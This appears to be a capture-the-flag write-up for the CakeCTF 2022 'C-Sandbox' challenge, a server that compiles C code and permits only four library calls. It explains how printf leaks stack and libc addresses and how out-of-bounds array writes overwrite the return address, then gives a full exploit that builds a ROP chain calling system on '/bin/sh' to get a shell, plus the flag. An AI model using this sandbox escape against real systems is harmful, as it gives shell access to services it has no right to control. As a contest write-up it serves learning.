---
title: "[Misc] C-Sandbox"
date: 2022-09-04 13:47:00
---

# 0x0 Introduction

I designed a restricted C compiler! nc misc.2022.cakectf.com 10099

files: [c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz](c_sandbox_c85cfad2fce8c0c6ac1dc144a1e4229c.tar.gz)

# 0x1 Walk through

Basically, the server will compile a C program and execute it. But it only allows 4 function to be called.


`sandbox.cpp`
```cpp
/* Allow these function calls */
        if (func && 
            (func->getName() == "puts"
             || func->getName() == "printf"
             || func->getName() == "__isoc99_scanf"
             || func->getName() == "exit"))
          continue;
```

Our goal is to get shell with this restriction. 

My first approach is using `asm` in C code. However, the sandbox also detect it and prevent me from executing asm codes.

Then, I tried my second solution. constructing a rop chain. 

Since we can use printf/puts in our code. We can simply print out the whole stack and find the libc address. Moreoever, The challenge also provide us a Dockerfile, so we can easily extract libc from it and get the libc functions offsets.

```c
printf(
        "1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n"
        "9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n"
        );
```

Modify the stack in C is very straighforward, just create a long array and modify the stack value using index.
```c
long x[1];
x[10] = 0x1 ; // modify the stack
```

# 0x2 Solution

```c
long __libc_start_main_ret = 0x24083;
long system_o = 0x52290;
long str_bin_sh = 0x1b45bd;
long pop_rdi_ret = 0x23b6a;
long ret_o = 0x22679;

int main()
{
    long x[1];
    x[0] = 0xffffffffffffffff;
    printf(
        "1.%1$p\n2.%2$p\n3.%3$p\n4.%4$p\n5.%5$p\n6.%6$p\n7.%7$p\n8.%8$p\n"
        "9.%9$p\n10.%10$p\n11.%11$p\n12.%12$p\n13.%13$p\n14.%14$p\n15.%15$p\n16.%16$p\n"
        );
    
    x[0] = x[2]-__libc_start_main_ret;
    printf("%p\n",x[0]);
    printf("%s\n",(char *)(x[0]+str_bin_sh));
    x[2] = x[0] + ret_o;
    x[3] = x[0] + pop_rdi_ret;
    x[4] = x[0] + str_bin_sh;
    x[5] = x[0] + system_o;
}
```

# 0x3 Flag & Thoughts

It is actually more like a pwn problem.

`CakeCTF{briI1ng_yoO0ur_oO0wn_gaA4dgeE3t!}`